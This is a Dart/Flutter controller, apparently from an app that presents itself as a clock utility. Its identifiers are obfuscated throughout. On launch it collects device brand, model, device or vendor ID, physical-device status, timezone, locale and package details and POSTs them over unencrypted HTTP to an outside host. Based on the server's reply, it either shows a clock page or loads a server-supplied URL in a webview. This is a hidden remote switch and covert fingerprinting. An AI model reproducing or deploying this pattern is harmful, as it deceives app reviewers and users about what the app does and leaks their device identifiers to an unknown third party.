import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void aoishbsdda() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/Apptimeout");
  }
}

class PageLogic extends GetxController {

  var yavouzje = RxBool(false);
  var rwksbucmav = RxBool(true);
  var ufpdrn = RxString("");
  var clint = RxBool(false);
  var rath = RxBool(true);
  final yeobughpms = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    aoishbsdda();
    super.onInit();
    buql();
  }


  Future<void> buql() async {

    clint.value = true;
    rath.value = true;
    rwksbucmav.value = false;

    yeobughpms.post("http://top.low-ofacr.com/WUtV2Nt1a",data: await bhqlgin()).then((value) {
      var znkgx = value.data["znkgx"] as String;
      var nimy = value.data["nimy"] as bool;
      if (nimy) {
        ufpdrn.value = znkgx;
        maximillia();
      } else {
        reichel();
      }
    }).catchError((e) {
      rwksbucmav.value = true;
      rath.value = true;
      clint.value = false;
    });
  }

  Future<Map<String, dynamic>> bhqlgin() async {
    final DeviceInfoPlugin pugfsq = DeviceInfoPlugin();
    PackageInfo vlmn_wkdxtge = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var vthrlmc = Platform.localeName;
    var cGRT = currentTimeZone;

    var zNwRYZ = vlmn_wkdxtge.packageName;
    var fIFLpOoD = vlmn_wkdxtge.version;
    var ZeNK = vlmn_wkdxtge.buildNumber;

    var kOzIhy = vlmn_wkdxtge.appName;
    var VksSLYf = "";
    var imuIGn  = "";
    var wvUl = "";
    var wilbertKulas = "";
    var kayceeKirlin = "";
    var hansCormier = "";
    var stanChamplin = "";
    var jaquelinHegmann = "";
    var santaKunze = "";
    var newtonMraz = "";
    var leaGislason = "";


    var lCncjT = "";
    var pkhec = false;

    if (GetPlatform.isAndroid) {
      lCncjT = "android";
      var hdyzigjque = await pugfsq.androidInfo;

      wvUl = hdyzigjque.brand;

      VksSLYf  = hdyzigjque.model;
      imuIGn = hdyzigjque.id;

      pkhec = hdyzigjque.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lCncjT = "ios";
      var xiczpa = await pugfsq.iosInfo;
      wvUl = xiczpa.name;
      VksSLYf = xiczpa.model;

      imuIGn = xiczpa.identifierForVendor ?? "";
      pkhec  = xiczpa.isPhysicalDevice;
    }
    var res = {
      "kOzIhy": kOzIhy,
      "ZeNK": ZeNK,
      "zNwRYZ": zNwRYZ,
      "VksSLYf": VksSLYf,
      "jaquelinHegmann" : jaquelinHegmann,
      "cGRT": cGRT,
      "santaKunze" : santaKunze,
      "wvUl": wvUl,
      "pkhec": pkhec,
      "imuIGn": imuIGn,
      "vthrlmc": vthrlmc,
      "lCncjT": lCncjT,
      "wilbertKulas" : wilbertKulas,
      "fIFLpOoD": fIFLpOoD,
      "kayceeKirlin" : kayceeKirlin,
      "hansCormier" : hansCormier,
      "stanChamplin" : stanChamplin,
      "newtonMraz" : newtonMraz,
      "leaGislason" : leaGislason,

    };
    return res;
  }

  Future<void> reichel() async {
    Get.offAllNamed("/ClockMainPage");
  }

  Future<void> maximillia() async {
    Get.offAllNamed("/Outreload");
  }

}
